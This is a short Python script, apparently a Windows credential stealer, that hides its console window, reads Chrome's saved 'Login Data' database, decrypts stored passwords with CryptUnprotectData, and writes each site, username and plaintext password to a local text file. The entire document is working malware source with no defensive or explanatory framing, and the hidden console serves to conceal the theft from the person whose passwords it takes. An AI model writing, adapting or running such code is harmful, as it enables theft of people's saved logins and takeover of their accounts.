from os import getenv
import sqlite3
import win32crypt

#Lets hide the console
import win32console, win32gui
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

#Lets Connect to the Database
conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()

#Lets get the results
cursor.execute('Select action_url, username_value, password_value FROM logins')
fp = open(r"file.txt", "a+")
fp.write("Chrome Saved Passwords\n")
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
    if password:
        fp.write('\nThe website is '+result[0])
        fp.write('\nThe Username is '+result[1])
        fp.write('\n The password is ' + str(password))



